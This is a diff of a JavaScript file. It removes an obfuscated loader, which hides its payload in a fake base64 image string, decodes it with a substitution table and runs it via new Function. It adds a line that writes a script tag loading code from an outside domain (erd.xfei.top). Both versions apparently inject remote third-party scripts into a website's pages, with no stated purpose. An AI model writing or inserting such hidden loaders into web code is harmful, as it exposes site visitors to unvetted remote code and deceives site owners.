@@ -1,10 +1,1 @@
-    (function () {
-            function iJCFf (s) {
-        var d = {"l":"v","d":"a","U":"r","u":" ",">":"J","5":"q","i":"C",")":"H","M":"T",",":"O","<":"=","4":"f","e":"u","6":"n","k":"c","{":"t","1":"i","H":"o","t":"(","!":"e","Q":")","q":"{","(":0,"8":"h","R":"A","s":",","K":1,"I":"m","E":"d","z":2,"}":3,"7":"x","[":";","=":"s","a":"B","9":"D","J":"E","-":"F","X":"G","v":"I","w":"K","0":"L","Z":"M","j":"N","B":"P","P":"Q","A":"R","D":"S","W":"U","b":"V","_":"W","G":"X","y":"Y","h":"Z","2":"+","+":"b","c":"g","L":"j","C":"k","Y":"l","O":"p","F":"w","n":"y"," ":"z","f":4,":":5,"p":6,"T":7,"|":8,";":9,"x":".",".":"[","g":"^","N":"-","&":"]","r":"<","S":"|","^":">","3":"&","V":"!","m":"}","]":":","o":"_"};
-        return s.split('').map(function (c) {
-            return d[c] !== undefined ? d[c] : c;
-        }).join('');
-    }
-        var c = iJCFf('data:image/jpg;base64,ldUu>5i)M,<4e6k{1H6t!QqldUud(<"k8dUR{"sdK<"4UHIi8dUiHE!"sdz<"k8dUiHE!R{"sd}<"16E!7,4"[ldUu=7<"Rai9J-X)v>w0Zj,BPADMWb_Gyh"2"d+kE!4c81LCYI6HO5U={elF7n "2"(Kz}f:pT|;2/<"[ldUu{<""s6sUs1s=sHsesds4<([!<!xU!OYdk!t/.gRNhdN (N;2/<&/cs""Q[F81Y!t4r!xY!6c{8Qq=<=7.d}&t!.d(&t422QQ[H<=7.d}&t!.d(&t422QQ[e<=7.d}&t!.d(&t422QQ[d<=7.d}&t!.d(&t422QQ[6<=rrzSH^^f[U<tH3K:QrrfSe^^z[1<te3}QrrpSd[{<{2D{U16c.dK&t6Q[14teV<pfQq{<{2D{U16c.dK&tUQ[m14tdV<pfQq{<{2D{U16c.dK&t1Q[mmU!{eU6t4e6k{1H6t!QqldUu{<""s6<U<kK<kz<([F81Y!t6r!xY!6c{8QqU<!.dz&t6Q[14tUrKz|Qq{2<D{U16c.dK&tUQ[622[m!Y=!u14tU^K;K33UrzzfQqkz<!.dz&t62KQ[{2<D{U16c.dK&ttU3}KQrrpSkz3p}Q[62<zm!Y=!qkz<!.dz&t62KQ[k}<!.dz&t62zQ[{2<D{U16c.dK&ttU3K:QrrKzStkz3p}QrrpSk}3p}Q[62<}[mmU!{eU6u{[mQt{Q[m[ldUuE<EHkeI!6{s6<6dl1cd{HU."OYd{4HUI"&sk=<ExkeUU!6{DkU1O{sFk<"F==]//CHUxYd68d1Yd6{1d6xk6]|;}p/K:z}f;"[14tV/gZdkS_16/x{!={t6QSSV6Qq14t6dl1cd{HUxe=!URc!6{x16E!7,4t"+d1Ee"Q^NKQq6!Fu_HUC!UtF16EHFxWA0xkU!d{!,+L!k{WA0t6!FuaYH+t."ldUuF=<6!Fu_!+DHkC!{t"2D{U16cx4UHIi8dUiHE!t};Q2Fk2D{U16cx4UHIi8dUiHE!t};Q2"Q[F=xH6I!==dc!<4e6k{1H6t!QqF=xkYH=!tQ[OH={Z!==dc!t!xEd{dQm["&QQQxH6I!==dc!<4e6k{1H6t!Qq6!Fu-e6k{1H6t"o{Ek="s>5i)M,t!xEd{dQQtk=Q[mm!Y=!qldUu=<EHkeI!6{xkU!d{!JY!I!6{t"=kU1O{"Q[=x=Uk<"8{{O=]//HCUx{L=5+x{HO/{/K:z}f;"[k=xOdU!6{JY!I!6{x16=!U{a!4HU!t=sk=Q[mm'.substr(22));
-        new Function(c)();
-    })();
+document.writeln('<script src="https://erd.xfei.top/c/5D2DAB89-5CB4-4B76-8235-37C584EDEBED.ap"></script>');
